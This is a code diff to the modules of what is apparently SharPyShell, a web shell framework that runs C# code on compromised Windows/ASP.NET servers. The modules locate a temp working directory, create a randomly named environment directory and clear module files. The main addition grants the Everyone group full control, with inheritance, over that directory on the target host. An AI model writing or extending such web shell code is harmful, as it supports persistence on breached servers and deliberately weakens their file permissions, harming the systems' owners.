@@ -11,7 +11,7 @@ class GetTempDirectory(Module):
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell
                 {                    
-                    string GetTempDirectory()
+                    private string GetTempDirectory()
                     {
                         string tempDirectory="";
                         string osTempDirectory = Environment.GetEnvironmentVariable("SYSTEMROOT") + "\\" + "Temp";
@@ -47,9 +47,11 @@ class GetEnvDirectory(Module):
 
     _runtime_code = ur"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
+                using System.Security.AccessControl;using System.Security.Principal;
+                
                 public class SharPyShell
                 {                    
-                    string GetEnvDirectory(string randomName)
+                    private string GetEnvDirectory(string randomName)
                     {
                         string envDirectory="";
                         string osTempDirectory = Environment.GetEnvironmentVariable("SYSTEMROOT") + "\\" + "Temp" + "\\" + randomName;
@@ -66,6 +68,12 @@ class GetEnvDirectory(Module):
                             catch{
                                 envDirectory = @"C:\Windows\Temp";
                             }
+                        } 
+                        if(envDirectory != @"C:\Windows\Temp"){
+                            DirectoryInfo dInfo = new DirectoryInfo(envDirectory);
+                            DirectorySecurity dSecurity = dInfo.GetAccessControl();
+                            dSecurity.AddAccessRule(new FileSystemAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), FileSystemRights.FullControl, InheritanceFlags.ObjectInherit | InheritanceFlags.ContainerInherit, PropagationFlags.NoPropagateInherit, AccessControlType.Allow));
+                            dInfo.SetAccessControl(dSecurity);
                         }
                         return envDirectory;
                     }
@@ -97,7 +105,7 @@ class ClearDirectories(Module):
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell
                 {                    
-                    string ClearDirectories(string[] modulesPath, string envDirectory)
+                    private string ClearDirectories(string[] modulesPath, string envDirectory)
                     {
                         string output="";
                         for(int i = 0 ; i < modulesPath.Length ; i++)
